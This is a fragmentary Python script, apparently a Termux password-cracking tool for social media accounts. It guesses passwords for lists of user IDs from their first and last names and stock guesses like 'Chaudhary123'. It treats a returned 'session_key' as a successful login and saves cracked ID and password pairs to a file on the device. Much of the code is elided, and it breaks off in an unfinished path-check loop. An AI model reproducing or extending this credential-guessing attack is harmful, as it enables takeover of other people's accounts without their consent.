...
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     M.HRIDAY CHAUDHARY 
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[HRIDAY] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[HRIDAY-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/HRIDAY_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                if pl in ['auto','Auto','AUTO','auto or Auto']:
                        ...
                        passlist.append('Chaudhary12')
                        passlist.append('ChaudharyChaudhary')
                        passlist.append('Chaudhary123')
                        ...
                        print(' Example first123,last123,Chaudhary123,firstlast')
                        print(50*"-")
                ...
                print(' Ok Ids Save In : /sdcard/HRIDAY_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/HRIDAY' in datar:
        pass
else:
        for i in range(5000):
